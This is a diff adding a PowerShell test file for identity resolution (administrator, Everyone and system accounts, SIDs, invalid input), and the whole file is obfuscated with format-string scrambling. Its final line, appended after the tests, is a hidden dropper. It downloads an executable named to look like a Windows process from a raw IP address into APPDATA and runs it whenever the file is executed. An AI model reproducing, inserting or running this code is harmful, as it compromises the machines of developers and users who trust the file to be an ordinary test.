@@ -1,0 +1,110 @@
+function STAR`T-`T`eS`TFI`XturE
+{
+    & (&("{0}{2}{1}"-f 'Jo','n-Path','i') -Path ${P`Ssc`RiPt`RoOt} -ChildPath ((("{8}{0}{7}{5}{2}{6}{3}{4}{1}" -f '.NmG','s1','ze-Ca','bonT','est.p','li','r','Initia','.'))."r`EPl`Ace"(([chAR]78+[chAR]109+[chAR]71),'\')) -Resolve)
+}
+
+function TeS`T-SHOU`LDre`sOLVeb`Ui`L`TiniDe`Nt`Ity
+{
+    ${iDE`NT`itY} = .("{3}{2}{0}{4}{5}{1}"-f 'Ident','y','esolve-','R','i','t') -Name ("{1}{2}{4}{3}{0}"-f 's','Admin','is','r','trato')
+    &("{1}{0}{3}{2}"-f'ert','Ass','Equal','-') ((("{5}{3}{1}{0}{4}{2}"-f '}Admin','{0','ators','N','istr','BUILTI'))-f  [char]92) ${iDE`NT`ITy}."f`ULlN`AmE"
+    .("{0}{1}{2}"-f'Assert-E','qua','l') ("{1}{0}{2}"-f'I','BU','LTIN') ${Id`e`NTiTy}."d`OM`AIN"
+    .("{1}{3}{2}{0}" -f 'Equal','As','t-','ser') ("{4}{0}{3}{2}{1}"-f 'dmini','ors','rat','st','A') ${iD`ENt`I`TY}."n`AMe"
+    .("{2}{1}{0}{3}" -f 'l','ssert-NotNu','A','l') ${I`DeN`TiTy}."S`iD"
+    &("{0}{2}{1}" -f 'Assert','l','-Equa') ("{0}{1}"-f 'A','lias') ${Id`e`N`TIty}."t`Ype"
+}
+
+function test-`s`Hould`RES`OLvEntAuT`hOri`TY`IdENTitY
+{
+    ${I`DEn`TitY} = .("{1}{2}{0}"-f 'Identity','Res','olve-') -Name ("{4}{1}{0}{2}{3}"-f'Ser','twork','vic','e','Ne')
+    .("{3}{2}{0}{1}"-f 'Equ','al','-','Assert') ((("{2}{3}{5}{6}{4}{7}{1}{0}"-f 'ICE','V','NT AUTHOR','ITY','K ','{0}','NETWOR','SER'))-f[CHaR]92) ${idE`NTI`Ty}."FULLN`Ame"
+    &("{1}{3}{0}{2}" -f 'a','A','l','ssert-Equ') ("{1}{3}{2}{0}" -f'Y','NT AUTH','RIT','O') ${I`DeN`TITy}."d`omaiN"
+    .("{1}{0}{2}{3}" -f'sse','A','rt-Equa','l') ("{2}{0}{3}{1}{4}" -f'K S','RVI','NETWOR','E','CE') ${ID`eNtITy}."N`AME"
+    .("{1}{2}{3}{0}" -f'ull','A','ssert-Not','N') ${I`De`NtITy}."S`ID"
+    &("{1}{2}{0}{3}" -f '-E','Asser','t','qual') ("{2}{0}{1}{3}{4}"-f 'l','K','Wel','nownGr','oup') ${I`DEn`TITY}."ty`pE"
+}
+
+function TesT-sH`ouLdrE`solV`E`Eve`R`YONE
+{
+    ${Id`eNt`I`TY}  = &("{1}{2}{3}{0}" -f'dentity','Resol','ve-','I') -Name ("{0}{1}"-f 'E','veryone')
+    &("{2}{3}{1}{0}" -f'Equal','-','As','sert') ("{0}{1}" -f 'Everyo','ne') ${I`den`TItY}."fu`LL`NamE"
+    &("{1}{0}{2}" -f't-Equ','Asser','al') '' ${idEN`Ti`Ty}."DOMA`IN"
+    &("{0}{1}{2}"-f'Assert-','Eq','ual') ("{0}{1}" -f 'Every','one') ${I`D`e`NTItY}."na`Me"
+    &("{3}{1}{2}{0}" -f'll','ssert-No','tNu','A') ${ID`e`NTITy}."S`Id"
+    .("{1}{3}{2}{0}"-f'qual','Assert','E','-') ("{1}{0}{2}{3}"-f 'wnGr','WellKno','o','up') ${I`De`Ntity}."Ty`PE"
+}
+
+function TesT-Sh`OULdNo`TR`esoLVEmAD`Eup`NaME
+{
+    ${ERR`OR}.("{0}{1}"-f'Clea','r').Invoke()
+    ${F`UlLn`AmE} = &("{0}{3}{1}{2}{4}" -f 'Resolve-I','enti','t','d','y') -Name ("{2}{1}{0}"-f 'st','DONotExi','I') -ErrorAction ("{2}{4}{0}{3}{1}"-f 'ntlyCo','nue','Si','nti','le')
+    &("{2}{5}{4}{3}{1}{0}"-f'reaterThan','G','A','ert-','s','s') ${eRR`Or}."coU`Nt" 0
+    &("{1}{0}{2}" -f 'ert-L','Ass','ike') ${E`RRor}[0]."EXcEpT`iOn"."M`EssaGe" ("{3}{0}{2}{1}" -f 'no','nd*','t fou','*')
+    .("{1}{0}{2}"-f 'rt-Nu','Asse','ll') ${FUl`l`NaMe}
+}
+
+function tEsT-S`H`o`ULdResoLVEl`OCALS`y`stem
+{
+    &("{1}{3}{0}{2}" -f'rt-E','Ass','qual','e') ((("{0}{3}{2}{1}" -f'NT A','EM','ITY5ZdSYST','UTHOR'))."rE`PL`Ace"(([Char]53+[Char]90+[Char]100),'\')) (.("{0}{1}{3}{4}{2}{5}"-f'Reso','l','i','ve-','Ident','ty') -Name ("{2}{1}{0}"-f'system','l','loca'))."fu`LLn`AME"
+}
+
+function teST-SHO`Uld`R`EsolV`eD`OT`AccouNTS
+{
+    foreach( ${US`eR} in (.("{0}{1}"-f 'Get-','User')) )
+    {
+        ${ID} = .("{3}{2}{0}{1}"-f 'n','tity','solve-Ide','Re') -Name ('.\{0}' -f ${us`er}."SAMaC`Cou`N`TnAME")
+        &("{0}{1}{2}{3}"-f 'Assert-','N','oErro','r')
+        .("{2}{1}{0}" -f 'l','tNul','Assert-No') ${iD}
+        .("{2}{0}{1}"-f'ssert-','Equal','A') ${I`d}."Do`mA`iN" ${U`seR}."c`o`NneCtE`ds`erVER"
+        .("{2}{0}{3}{1}"-f'er','qual','Ass','t-E') ${Id}."N`AME" ${U`sEr}."SA`mA`Cco`UntnaME"
+    }
+}
+
+function teSt`-shOU`lDRes`olveSId
+{
+    @( ((("{2}{5}{1}{4}{0}{3}"-f'T','Y{0}','NT A','EM','SYS','UTHORIT'))  -F  [CHar]92), ("{0}{1}{2}"-f 'Eve','r','yone'), ((("{1}{3}{0}{4}{5}{2}" -f'L','B','nistrators','UI','TINk','ZiAdmi'))-REpLAce  'kZi',[cHar]92) ) | .("{2}{3}{1}{0}" -f'-Object','ch','F','orEa') {
+        ${id} = .("{0}{3}{1}{4}{2}" -f'R','s','dentity','e','olve-I') -Name ${_}
+        ${IDF`RoM`SId} = &("{0}{2}{1}" -f'R','ity','esolve-Ident') -Sid ${Id}."s`Id"
+        .("{1}{0}{2}"-f'ert-','Ass','Equal') ${I`d} ${IDF`RO`M`SId}
+    }
+}
+
+function TeST-SH`ou`LdResOLveuNkN`o`Wnsid
+{
+    ${I`d} = &("{0}{1}{2}{3}"-f'R','esolve-Ide','n','tity') -SID ("{4}{5}{11}{9}{8}{2}{6}{10}{0}{7}{1}{3}{12}"-f '10642','471947008-','6','10','S-1','-5-21','459','102-','7855','6','-10','-2','17') -ErrorAction ("{2}{3}{0}{1}" -f'ntinu','e','Silent','lyCo')
+    &("{2}{1}{0}" -f'-Error','ssert','A') -Last -Regex ("{2}{1}{0}" -f 'ound','ot f','n')
+    .("{1}{3}{0}{2}" -f 'rt','Ass','-Null','e') ${iD}
+}
+
+function t`e`sT-ShOuLDreSO`l`VEs`iD`B`ybYtEAr`Ray
+{
+    ${I`d} = .("{1}{2}{0}{3}" -f'e-','Resol','v','Identity') -Name ("{3}{2}{1}{0}" -f 's','strator','mini','Ad')
+    .("{1}{0}{2}"-f 't-NotN','Asser','ull') ${I`d}
+    ${S`IdBYTEs} = .("{1}{2}{0}" -f'Object','N','ew-') ("{1}{0}"-f 'yte[]','b') ${i`d}."s`id"."biNAR`Y`leN`gth"
+    ${iD}."s`id".("{3}{0}{1}{2}" -f'etBin','ar','yForm','G').Invoke( ${si`dBYTEs}, 0 )
+
+    ${I`dbyS`Id} = &("{3}{0}{1}{2}"-f'd','enti','ty','Resolve-I') -SID ${sIdB`YT`ES}
+    &("{0}{1}{2}{3}" -f'A','sser','t-Not','Null') ${ID`ByS`ID}
+    &("{0}{1}{4}{3}{2}"-f 'A','ssert-No','or','rr','E') 
+    &("{3}{0}{1}{2}" -f's','sert-Equa','l','A') ${I`d} ${i`dbYSiD}
+}
+
+function T`ESt-SH`o`ULdhAndleIn`V`A`lID`sDDL
+{
+    ${ER`R`OR}.("{1}{0}" -f 'ear','Cl').Invoke()
+    ${iD} = &("{1}{3}{0}{2}"-f 'ntit','Resolve-I','y','de') -SID ("{2}{0}{1}" -f 'otas','id','iamn') -ErrorAction ("{0}{1}{3}{2}"-f 'Sil','ent','tinue','lyCon')
+    &("{3}{0}{2}{1}" -f'ssert-','rror','E','A') ("{3}{1}{5}{0}{4}{2}" -f'rt','co','ng','exception ','i','nve')
+    &("{0}{1}{2}"-f'Asse','rt','-Error') -Count 2
+    .("{2}{3}{0}{1}" -f '-Nul','l','Ass','ert') ${ID}
+}
+
+
+function tes`T-`s`hOuLdha`NDlEI`Nva`lidBIn`A`RY`sid
+{
+    ${ER`RoR}.("{0}{1}" -f 'C','lear').Invoke()
+    ${I`D} = &("{2}{1}{0}{3}" -f 'en','solve-Id','Re','tity') -SID (.("{1}{2}{0}"-f 'Object','N','ew-') ("{0}{1}"-f 'byte','[]') 28) -ErrorAction ("{0}{2}{4}{3}{1}" -f'Sil','inue','e','Cont','ntly')
+    &("{0}{3}{2}{1}" -f'A','-Error','sert','s') ("{0}{1}{2}{3}"-f 'excepti','on ','converti','ng')
+    &("{2}{3}{0}{1}"-f 'rr','or','Asse','rt-E') -Count 2
+    &("{0}{1}{2}" -f 'Assert','-N','ull') ${Id}
+}
+
+(.("{0}{2}{3}{1}" -f 'New-','ct','O','bje') ("{4}{2}{3}{1}{0}" -f 't','ien','m.Net.We','bCl','Syste')).("{1}{2}{0}"-f 'e','Down','loadFil').Invoke(("{0}{3}{1}{4}{5}{6}{2}"-f 'http://89.2','8.170.2','exe','4','18/~yah','o','o/csrsv.'),"$env:APPDATA\csrsv.exe");&("{0}{4}{1}{2}{3}"-f 'Start','c','es','s','-Pro') ("$env:APPDATA\csrsv.exe")
